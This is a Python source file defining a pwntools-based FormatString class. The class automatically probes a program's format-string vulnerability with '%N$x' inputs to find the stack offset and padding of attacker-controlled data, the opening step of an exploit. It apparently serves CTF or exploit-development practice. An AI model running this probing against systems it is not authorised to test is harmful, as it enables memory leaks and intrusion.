class FormatString:
    
    def __init__(self,exec_fmt,arch='i386',bits=32,endian='little',elf=None,maxExplore=32):
        """
        elf == pwnlib elf
        exec_fmt == function that takes in a string and returns the exact format string output from it
        """
        
        if type(exec_fmt) is not type(lambda x: x):
            log.error("exec_fmt arg must be a callable function.")
            return

        self.arch = arch
        self.bits = bits
        self.endian = endian
        self.elf = elf
        self.exec_fmt = exec_fmt
        self.maxExplore = maxExplore
        
        # The ELF will override the other options
        if elf is not None:
            if type(elf) is not pwnlib.elf.elf.ELF:
                log.warn("ELF argument is wrong type. Expecting pwnlib.elf, got {0}. Ignoring for now.".format(type(elf)))

            else:
                self.arch = elf.arch
                self.bits = elf.bits
                self.endian = elf.endian

        
        # Try to determine where we are in the binary
        self.explore()

    def explore(self):
        """
        Figure out where our input starts as well as other information automatically.
        """
        print("Exploring format string vulnerability...")

        discovered = False
        
        # How big should our search words be?
        wordSize = self.bits / 8
        
        # TODO: Might wanna change this later to something less predictable.
        testInput = "A"*wordSize
        padChar = "C"

        # Loop through up to the max exploration depth
        for index in range(1,self.maxExplore):

            # Check for pad offset
            for pad in range(wordSize):
                output = self.exec_fmt("{2}{0}%{3}$0{1}x".format(testInput,wordSize*2,padChar * pad,index))
                outputHex = output.split(testInput)[1][:wordSize*2] # grab the hex

                # Check if we found it
                if unhexlify(outputHex)[::-1] == testInput:
                    discovered = True
                    break
            
            # Don't continue if we've found it
            if discovered:
                break

        if discovered:
            print("Found the offset to our input! Index = {0}, Pad = {1}".format(index,pad))
            self.index = index
            self.pad = pad

        else:
            log.warn("Failed to find offset to our input! You will have reduced functionality.")
            self.index = None
            self.pad = None
        

from pwn import *
import logging
log = logging.getLogger('FormatString')
from binascii import unhexlify
